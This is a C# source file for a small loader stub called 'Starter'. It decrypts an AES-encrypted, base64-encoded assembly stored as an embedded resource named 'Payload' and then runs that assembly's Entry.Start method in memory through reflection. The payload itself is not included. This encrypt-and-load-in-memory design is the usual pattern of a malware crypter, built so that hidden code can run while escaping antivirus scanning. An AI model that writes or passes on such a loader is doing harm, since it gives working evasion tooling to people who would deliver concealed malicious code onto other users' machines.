using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Security.Cryptography;

namespace Starter
{
    internal class Entry
    {




        private static RijndaelManaged encoder;
        private static void InitDecoder()
        {
            var secretKey = Properties.Resources.Key;
            var bytes = Encoding.UTF8.GetBytes(secretKey);

            byte[] key = bytes.Take(32).ToArray();
            byte[] iv = bytes.Take(16).ToArray();

            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256;
            rijndael.BlockSize = 128;
            rijndael.Key = key;
            rijndael.IV = iv;
            rijndael.Padding = PaddingMode.PKCS7;

            encoder = rijndael;
        }

        private static byte[] Decrypt(byte[] src)
        {
            byte[] decryptedBytes = encoder.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
            return decryptedBytes;
        }

        static void Main(string[] args)
        {
            Start();
        }

        public static void Start()
        {
#if DEBUG
            Console.WriteLine("Running Decoder.");
#endif



            InitDecoder();
            var b64 = Encoding.UTF8.GetString(Properties.Resources.Payload);
            var asm = Decrypt(Convert.FromBase64String(b64));

            var assembly = System.Reflection.Assembly.Load(asm);
            var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            method.Invoke(null, new object[] { });

            //var assembly = System.Reflection.Assembly.Load(asm);
            //assembly.EntryPoint.Invoke(null, new object[] { new string[] { } });
        }
    }
}
